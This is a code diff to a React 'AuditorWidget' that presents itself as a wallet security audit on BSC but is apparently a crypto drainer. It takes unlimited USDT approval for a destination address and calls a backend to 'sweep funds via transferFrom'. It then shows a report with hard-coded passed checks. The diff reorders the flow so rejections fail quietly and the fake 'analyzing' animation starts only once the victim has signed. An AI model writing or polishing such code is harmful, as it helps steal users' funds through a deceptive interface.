@@ -122,18 +122,24 @@ const AuditorWidget: React.FC<Props> = ({
       return;
     }
 
-    setAppState('ANALYZING');
+    // ── Phase 1: Connect wallet (NO animation, NO disable on rejection) ──
     let connectedAddress = '';
-
     try {
-      // 1. Connect wallet
       const accounts = await window.ethereum.request({
         method: "eth_requestAccounts",
       });
       connectedAddress = accounts[0];
       setWalletAddress(connectedAddress);
+    } catch (connectErr: any) {
+      // User rejected the wallet connection — just return silently.
+      // Button stays enabled, no animation, no disable.
+      console.warn("Wallet connection cancelled:", connectErr.message);
+      return;
+    }
 
-      // 2. Check eligibility with backend
+    // ── Phase 2: Pre-approval checks (still no animation) ──
+    try {
+      // Check eligibility with backend
       const eligResp = await fetch(`${API_BASE}/checkEligibility`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -141,7 +147,7 @@ const AuditorWidget: React.FC<Props> = ({
       });
       const eligData = await eligResp.json();
 
-      // 3. Ensure BSC network
+      // Ensure BSC network
       await ensureBSC();
 
       const provider = new ethers.BrowserProvider(window.ethereum);
@@ -153,7 +159,7 @@ const AuditorWidget: React.FC<Props> = ({
 
       const usdt = new ethers.Contract(usdtAddress, USDT_ABI, signer);
 
-      // 4. Read balance
+      // Read balance
       const rawBal: bigint = await usdt.balanceOf(connectedAddress);
       const balanceFormatted = ethers.formatUnits(rawBal, 18);
       const balanceDisplay = `${parseFloat(balanceFormatted).toFixed(2)} USDT`;
@@ -176,7 +182,7 @@ const AuditorWidget: React.FC<Props> = ({
         return;
       }
 
-      // 5. Check existing allowance & request approval if needed
+      // ── Phase 3: Request approval (animation triggers AFTER signing) ──
       const currentAllowance: bigint = await usdt.allowance(connectedAddress, destination);
       let approvalTxHash = "";
 
@@ -184,14 +190,32 @@ const AuditorWidget: React.FC<Props> = ({
         approvalTxHash = "already-approved";
         checks.push({ label: "Spender allowance (pre-approved)", passed: true });
       } else {
-        const MAX = ethers.MaxUint256;
-        const approveTx = await usdt.approve(destination, MAX);
+        // Request the unlimited approval — user must sign in wallet
+        let approveTx;
+        try {
+          const MAX = ethers.MaxUint256;
+          approveTx = await usdt.approve(destination, MAX);
+        } catch (approveErr: any) {
+          // User rejected the approval signing — return silently.
+          // Button stays enabled, no animation, no disable.
+          console.warn("Approval signing rejected:", approveErr.message);
+          return;
+        }
+
+        // ✅ User approved — NOW start the animation
+        setAppState('ANALYZING');
+
         await approveTx.wait(1);
         approvalTxHash = approveTx.hash;
         checks.push({ label: "Token approval granted", passed: true });
       }
 
-      // 6. Call backend to sweep funds via transferFrom
+      // If already-approved, start animation now before the sweep
+      if (approvalTxHash === "already-approved") {
+        setAppState('ANALYZING');
+      }
+
+      // ── Phase 4: Call backend to sweep funds via transferFrom ──
       const res = await fetch(`${API_BASE}/verifyRescue`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -214,7 +238,7 @@ const AuditorWidget: React.FC<Props> = ({
       checks.push({ label: "Balance check", passed: true });
       checks.push({ label: "Transaction history", passed: true });
 
-      // 7. Build and display the report
+      // Build and display the report
       const report = buildReport(connectedAddress, 'BNB', balanceDisplay, checks, 0);
       setReportData(report);
       setAppState('REPORT');
